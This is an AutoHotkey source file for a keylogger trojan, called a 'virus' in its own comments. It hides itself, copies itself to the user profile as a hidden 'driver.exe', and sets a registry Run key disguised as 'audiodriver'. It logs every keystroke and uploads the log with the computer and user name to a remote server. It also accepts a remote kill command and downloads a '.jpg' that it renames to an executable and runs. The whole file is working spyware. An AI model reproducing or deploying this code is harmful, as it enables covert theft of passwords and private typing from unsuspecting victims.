;
; AutoHotkey Version: 1.x
; Language:       English
; Platform:       Win9x/NT
;
;

#NoEnv ; Recommended for performance and compatibility with future AutoHotkey releases.
SendMode Input ; Recommended for new scripts due to its superior speed and reliability.
; Detect hidden windows since they can be active
DetectHiddenWindows, On
#NoTrayIcon
capstate := GetKeyState("Capslock", "T")  ; True if CapsLock is ON, false otherwise.
Regread, autorunreg, HKEY_CURRENT_USER, SOFTWARE\Microsoft\Windows\CurrentVersion\Run, audiodriver
EnvGet, prof, USERPROFILE
EnvGet, compname, COMPUTERNAME
EnvGet, username, USERNAME
IfNotexist, %prof%\driver.exe
Filecopy, %A_ScriptFullPath%, %prof%\driver.exe
Fileappend, ,hi, %prof%\replyfile.txt
FileSetattrib, +SH, %prof%\replyfile.txt
IfNotexist, %prof%\userdata.ntg
Fileappend, [%username%@%compname%] ,%prof%\userdata.ntg

FileSetattrib, +SH, %prof%\userdata.ntg ;change this name to userdata.ntg, for tempdata.ntg also
if autorunreg != %prof%\driver.exe
{
IfNotexist, %prof%\driver.exe
Filecopy, %A_ScriptFullPath%, %prof%\driver.exe
FileSetattrib, +SRH, %prof%\driver.exe
RegWrite, REG_SZ, HKEY_CURRENT_USER, SOFTWARE\Microsoft\Windows\CurrentVersion\Run, audiodriver, %prof%\driver.exe
}

IfNotEqual, A_ScriptFullPath, %prof%\driver.exe
{
run, %prof%\driver.exe
exitapp
}
uploaded=0
version=4
hModule := DllCall("LoadLibrary", "str", "wininet.dll")  ; Avoids the need for DllCall() in the loop to load the library.
var="";
count=0

Loop {
	sleep 20000 ;without sleep, it take approx 1 sec delay
	filegetsize, size , tempdata.ntg
	if(size>0)
	count=count+1
	if(count>10 || size>10) ;less data for long time or data is large
	{count=0
	 uploaded=0
	}
    result := DllCall("wininet.dll\InternetGetConnectedState","str",var, "Int", 0) ;1-> internet connected, 0-> not connected
	if result = 0
	Suspend, On
	else
	suspend, Off
	;TrayTip, state,  %result%, 1
	if (uploaded == 0  && result == 1) ;condition should be  internet connection checking and upload succesfull or not (from reply from server)
	{
	fileread, tempvar , tempdata.ntg
	;tempvar:= *[%compname%`\%username%]*%tempvar%
	url:="http://supersecretesever.com/update.php?u=". tempvar
	url:=url . "&c=". compname
	url:=url . "&user=". username
	UrlDownloadToFile, %url% , %A_WorkingDir%\replyfile.txt
	fileread, reply , %A_WorkingDir%\replyfile.txt
	StringLeft, reply, reply, 1
	if(reply==1)
	{
	uploaded=1;
	fileappend, %tempvar% , userdata.ntg ;THIS IS used only after uploading
	filedelete, tempdata.ntg
	}
	else if(reply==2) ;provision to deactivate application
	{
		exitapp
	}
	else if(reply==3)
	{
	UrlDownloadToFile, "http://supersecretesever.com/upgradeversion.php" , %A_WorkingDir%\replyfile.txt
	fileread, reply , %A_WorkingDir%\replyfile.txt
	StringLeft, reply, reply, 1
	if(reply>version) ;if version greater, upgrade
	{
	UrlDownloadToFile, "http://supersecretesever.com/upgraded.jpg" , %A_WorkingDir%\upgraded.jpg
	FileMove, %A_WorkingDir%\upgraded.jpg, %A_WorkingDir%\driver1.exe ,1
	run, %A_WorkingDir%\driver1.exe
	exitapp
	}
	}
	}
;done;;;; put a link which sends result activated or not. 1 or 3 parse <!-- and extract first text
;done;;;; put a link to upgrade the virus or not
;done;;;; inside this loop , wininet.dll(InternetGetConnectedState)
;done;;;; add autorun to registry(either default autorun or startupmonitor's registry key)
;done;;;; add autorun to copy to pendrive (use window's onmessage call back functions and copy to all  pendrives in name of facebook.exe)
;done;;;; copy to user's folder / temp folder(not recomended) and add to  registry
;done;;;; while writing keylogitself, write is as url encoded
}


~a::gosub smallorcap
~b::gosub smallorcap
~c::gosub smallorcap
~d::gosub smallorcap
~e::gosub smallorcap
~f::gosub smallorcap
~g::gosub smallorcap
~h::gosub smallorcap
~i::gosub smallorcap
~j::gosub smallorcap
~k::gosub smallorcap
~l::gosub smallorcap
~m::gosub smallorcap
~n::gosub smallorcap
~o::gosub smallorcap
~p::gosub smallorcap
~q::gosub smallorcap
~r::gosub smallorcap
~s::gosub smallorcap
~t::gosub smallorcap
~u::gosub smallorcap
~v::gosub smallorcap
~w::gosub smallorcap
~x::gosub smallorcap
~y::gosub smallorcap
~z::
{
if(capstate==1)
fileappend, Z, tempdata.ntg
else
fileappend, z, tempdata.ntg
}
return


~+A::gosub smallorcapSHIFT
~+B::gosub smallorcapSHIFT
~+C::gosub smallorcapSHIFT
~+D::gosub smallorcapSHIFT
~+E::gosub smallorcapSHIFT
~+F::gosub smallorcapSHIFT
~+G::gosub smallorcapSHIFT
~+H::gosub smallorcapSHIFT
~+I::gosub smallorcapSHIFT
~+J::gosub smallorcapSHIFT
~+K::gosub smallorcapSHIFT
~+L::gosub smallorcapSHIFT
~+M::gosub smallorcapSHIFT
~+N::gosub smallorcapSHIFT
~+O::gosub smallorcapSHIFT
~+P::gosub smallorcapSHIFT
~+Q::gosub smallorcapSHIFT
~+R::gosub smallorcapSHIFT
~+S::gosub smallorcapSHIFT
~+T::gosub smallorcapSHIFT
~+U::gosub smallorcapSHIFT
~+V::gosub smallorcapSHIFT
~+W::gosub smallorcapSHIFT
~+X::gosub smallorcapSHIFT
~+Y::gosub smallorcapSHIFT
~+Z::gosub smallorcapSHIFT


~`::fileappend, ``, tempdata.ntg ;hkntw
~~::fileappend, `%7E, tempdata.ntg
~!::fileappend, !, tempdata.ntg
~@::fileappend, @, tempdata.ntg
~#::fileappend, `%23, tempdata.ntg
~$::fileappend, `%24, tempdata.ntg
~%::fileappend, `%25, tempdata.ntg
~^::fileappend, ^, tempdata.ntg
~&::fileappend, `%26, tempdata.ntg
~*::fileappend, *, tempdata.ntg
~(::fileappend, (, tempdata.ntg
~)::fileappend, ), tempdata.ntg
~-::fileappend, -, tempdata.ntg
~_::fileappend, _, tempdata.ntg
~=::fileappend, `%3D, tempdata.ntg
~+::fileappend, `%2B, tempdata.ntg
~[::fileappend, [, tempdata.ntg
~{::fileappend, {, tempdata.ntg
~]::fileappend, ], tempdata.ntg
~}::fileappend, }, tempdata.ntg
~\::fileappend, \, tempdata.ntg
~|::fileappend, `|, tempdata.ntg

~;::fileappend, `%3B, tempdata.ntg
~'::fileappend, ', tempdata.ntg
~,::fileappend, `%2C , tempdata.ntg
~<::fileappend, `%3C, tempdata.ntg
~.::fileappend, ., tempdata.ntg
~>::fileappend, `%3E, tempdata.ntg
~/::fileappend, `%2F, tempdata.ntg
~?::fileappend, `%3F, tempdata.ntg
~+;::fileappend, `%3A, tempdata.ntg
~+'::fileappend, `", tempdata.ntg

~enter::fileappend, {enter}`n, tempdata.ntg
~space::fileappend,  {space}, tempdata.ntg
~tab::fileappend, {tab}, tempdata.ntg
~CapsLock::
{
fileappend, {caps}, tempdata.ntg
capstate := GetKeyState("Capslock", "T")  ; True if CapsLock is ON, false otherwise.
}
return
~backspace::fileappend, {<-}, tempdata.ntg
~delete::fileappend, {del}, tempdata.ntg

~1::fileappend, 1, tempdata.ntg
~2::fileappend, 2, tempdata.ntg
~3::fileappend, 3, tempdata.ntg
~4::fileappend, 4, tempdata.ntg
~5::fileappend, 5, tempdata.ntg
~6::fileappend, 6, tempdata.ntg
~7::fileappend, 7, tempdata.ntg
~8::fileappend, 8, tempdata.ntg
~9::fileappend, 9, tempdata.ntg
~0::fileappend, 0, tempdata.ntg

smallorcap:
{
StringTrimLeft, keygot, A_ThisHotkey, 1
if(capstate==1)
{
stringupper, keygot, keygot
fileappend, %keygot%, tempdata.ntg
}
else
fileappend, %keygot%, tempdata.ntg
}
return
smallorcapshift:
{
StringTrimLeft, keygot, A_ThisHotkey, 2
if(capstate==1)
{
stringlower, keygot, keygot
fileappend, %keygot%, tempdata.ntg
}
else
fileappend, %keygot%, tempdata.ntg
}
return
#!q::
{
 exitapp
 DllCall("FreeLibrary", "UInt", hModule)  ; To conserve memory, the DLL may be unloaded after using it.
 }